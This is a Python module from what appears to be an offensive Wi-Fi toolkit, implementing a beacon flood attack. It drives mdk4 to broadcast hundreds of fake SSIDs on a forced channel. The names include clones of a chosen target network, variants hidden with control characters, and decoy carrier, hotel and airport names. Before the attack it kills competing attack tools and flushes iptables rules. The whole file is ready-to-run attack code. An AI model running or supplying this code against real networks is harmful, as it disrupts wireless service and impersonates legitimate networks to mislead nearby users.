# attacks/beacon_flood.py


import subprocess
import time
import os
import shutil
from typing import Optional
from termcolor import colored
from .base import BaseAttack


class BeaconFlood(BaseAttack):
    def __init__(self, monitor_interface: str, target_ssid: Optional[str] = None, target_channel: Optional[str] = None):
        super().__init__(monitor_interface)
        self.target_ssid = target_ssid
        self.target_channel = str(target_channel) if target_channel else None
        self.proc = None
        self.temp_wordlist = "/tmp/rubyfi_ssids.txt"


    def cleanup_previous_attacks(self):
        """Kill all previous attacks and rogue APs before starting."""
        print(colored("\n🧹 Cleaning up previous attacks...", "cyan"))
        
        # Kill all conflicting processes
        kill_procs = [
            "mdk4", "airbase-ng", "wifiphisher", "hostapd",
            "dnsmasq", "lighttpd", "aireplay-ng"
        ]
        for proc in kill_procs:
            subprocess.run(f"pkill -f {proc}", shell=True, capture_output=True)
        
        # Kill all at* interfaces
        for i in range(5):
            subprocess.run(f"ip link set at{i} down 2>/dev/null", shell=True, capture_output=True)
        
        # Clean iptables
        subprocess.run("iptables -t nat -F 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("iptables -F 2>/dev/null", shell=True, capture_output=True)
        
        time.sleep(2)
        print(colored("[✓] Previous attacks cleared!", "green"))


    def lock_channel(self, channel: str):
        """Lock monitor interface to specific channel for maximum visibility."""
        try:
            subprocess.run(
                ["iw", "dev", self.monitor_interface, "set", "channel", channel],
                capture_output=True,
                check=True
            )
            print(colored(f"[✓] Interface locked to channel {channel}", "green"))
        except Exception as e:
            print(colored(f"[!] Channel lock warning: {e}", "yellow"))
            # Try alternative method
            subprocess.run(
                f"iwconfig {self.monitor_interface} channel {channel}",
                shell=True, capture_output=True
            )


    def _execute(self):
        print(colored("\n" + "="*60, "magenta", attrs=['bold']))
        print(colored("    📡 BEACON FLOOD ATTACK (SSID CHAOS) 📡", "magenta", attrs=['bold']))
        print(colored("="*60, "magenta", attrs=['bold']))

        # AUTO CLEANUP BEFORE ATTACK
        self.cleanup_previous_attacks()

        print(colored("\n[?] Select Flood Mode:", "yellow", attrs=['bold']))
        print("  [1] Use rockyou.txt (Optimized Sample)")
        print(f"  [2] High-Visibility Clone (100+ clones of '{self.target_ssid}')")
        print("  [3] Custom Wordlist Path")
        print("  [4] MAXIMUM VISIBILITY (Force 2.4GHz Channel 6)")
        print("  [0] Cancel")

        choice = input(colored("\n ➤ Select mode: ", "cyan")).strip()

        if choice == "1":
            raw_path = "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(raw_path):
                print(colored(f"[!] Error: {raw_path} not found.", "red"))
                return
            wordlist_path = self._prepare_ssid_sample(raw_path)

        elif choice == "2" and self.target_ssid:
            print(colored(f"[*] Generating 150 unique invisible SSIDs for '{self.target_ssid}'...", "cyan"))

            stealth_ssids = []
            for i in range(1, 151):
                char = "\x1e" if i % 2 == 0 else "\x1f"
                stealth_ssids.append(f"{self.target_ssid}{char}{i}")

            with open(self.temp_wordlist, 'w') as f:
                f.write("\n".join(stealth_ssids))
            wordlist_path = self.temp_wordlist

        elif choice == "3":
            wordlist_path = input(colored(" ➤ Enter path: ", "cyan")).strip()

        elif choice == "4":
            # MAXIMUM VISIBILITY MODE - Force channel 6 (2.4GHz)
            wordlist_path = self._generate_visible_ssids()

        else:
            return

        if not wordlist_path or not os.path.exists(wordlist_path):
            print(colored("[!] Error: Wordlist preparation failed.", "red"))
            return

        # Lock channel BEFORE launching flood
        # Mode 4 = force channel 6, others use target channel
        if choice == "4":
            flood_channel = "6"
        elif self.target_channel:
            # If target is 5GHz (channel > 14), fallback to channel 6
            try:
                ch = int(self.target_channel)
                flood_channel = self.target_channel if ch <= 14 else "6"
                if ch > 14:
                    print(colored(f"[!] Target channel {ch} is 5GHz!", "yellow"))
                    print(colored("[!] Falling back to channel 6 (2.4GHz) for visibility", "yellow"))
            except:
                flood_channel = "6"
        else:
            flood_channel = "6"

        # Lock interface to channel
        print(colored(f"\n[*] Locking to channel {flood_channel}...", "cyan"))
        self.lock_channel(flood_channel)
        time.sleep(1)

        # Build mdk4 command with locked channel
        cmd = [
            "mdk4",
            self.monitor_interface,
            "b",
            "-f", wordlist_path,
            "-m",                   # Mix channel hopping OFF
            "-s", "1200",           # High speed
            "-c", flood_channel     # FORCE channel
        ]

        print(colored(f"[*] Flooding on channel {flood_channel}...", "green"))
        self._launch_flood(cmd, "Beacon Flood")


    def _generate_visible_ssids(self) -> Optional[str]:
        """Generate highly visible SSIDs for maximum visibility on 2.4GHz."""
        try:
            visible_ssids = []
            
            # Popular network names that phones will definitely show
            base_names = [
                "FREE_WIFI", "Jio_WiFi", "Airtel_4G", "BSNL_Broadband",
                "Hotel_Guest", "Airport_WiFi", "Coffee_WiFi", "School_WiFi",
                "Office_WiFi", "Home_Network", "AndroidAP", "iPhone_Hotspot",
                "TP-Link_Guest", "Netgear_Guest", "DLink_Guest", "ASUS_Guest",
                "Reliance_Jio", "Vodafone_WiFi", "Idea_Network", "BSNL_WiFi",
                "Public_WiFi_1", "Public_WiFi_2", "Free_Internet", "Open_WiFi",
            ]
            
            # Add target SSID clones if available
            if self.target_ssid:
                for i in range(1, 50):
                    visible_ssids.append(f"{self.target_ssid}_{i}")
                    visible_ssids.append(f"{self.target_ssid}_2G_{i}")
                    visible_ssids.append(f"{self.target_ssid}_EXT_{i}")
            
            # Add base names with numbers
            for name in base_names:
                for i in range(1, 6):
                    visible_ssids.append(f"{name}_{i}")
            
            # Write to file
            with open(self.temp_wordlist, 'w') as f:
                f.write("\n".join(visible_ssids[:500]))
            
            print(colored(f"[✓] Generated {len(visible_ssids[:500])} visible SSIDs", "green"))
            return self.temp_wordlist
            
        except Exception as e:
            print(colored(f"[!] Error generating SSIDs: {e}", "red"))
            return None


    def _prepare_ssid_sample(self, source_path: str, limit: int = 500) -> Optional[str]:
        try:
            ssids = set()
            with open(source_path, 'r', errors='ignore') as f:
                for line in f:
                    clean = line.strip()
                    if 0 < len(clean) <= 32:
                        ssids.add(clean)
                    if len(ssids) >= limit:
                        break
            with open(self.temp_wordlist, 'w') as f:
                f.write("\n".join(ssids))
            print(colored(f"[✓] Prepared {len(ssids)} SSIDs from wordlist", "green"))
            return self.temp_wordlist
        except Exception as e:
            print(colored(f"[!] Wordlist error: {e}", "red"))
            return None


    def _launch_flood(self, cmd, mode_desc):
        try:
            print(colored(f"\n[CMD] {' '.join(cmd)}", "white"))
            print(colored(f"[*] Starting {mode_desc}...", "cyan"))
            
            self.proc = subprocess.Popen(cmd)
            
            print(colored("\n╔" + "═"*50 + "╗", "green", attrs=['bold']))
            print(colored("║" + " "*15 + "✓ FLOOD ACTIVE!" + " "*20 + "║", "green", attrs=['bold']))
            print(colored("╚" + "═"*50 + "╝", "green", attrs=['bold']))
            
            print(colored("\n💡 Check your phone WiFi list (wait 15-20 seconds)", "yellow"))
            print(colored("💡 Make sure your phone is scanning 2.4GHz", "yellow"))
            print(colored("💡 Disable 5GHz on your phone if SSIDs not showing", "yellow"))
            print(colored("\n   Press Ctrl+C to stop\n", "magenta"))
            
            # Show live status
            start_time = time.time()
            while self.proc.poll() is None:
                elapsed = int(time.time() - start_time)
                print(colored(f"\r   ⏳ Flooding... {elapsed}s elapsed | Press Ctrl+C to stop", "cyan"), end="")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(colored("\n\n[!] Stopping flood...", "yellow"))
        finally:
            if self.proc:
                self.proc.terminate()
                subprocess.run("pkill mdk4", shell=True, capture_output=True)
            if os.path.exists(self.temp_wordlist):
                os.remove(self.temp_wordlist)
            print(colored("[✓] Beacon flood stopped", "green"))
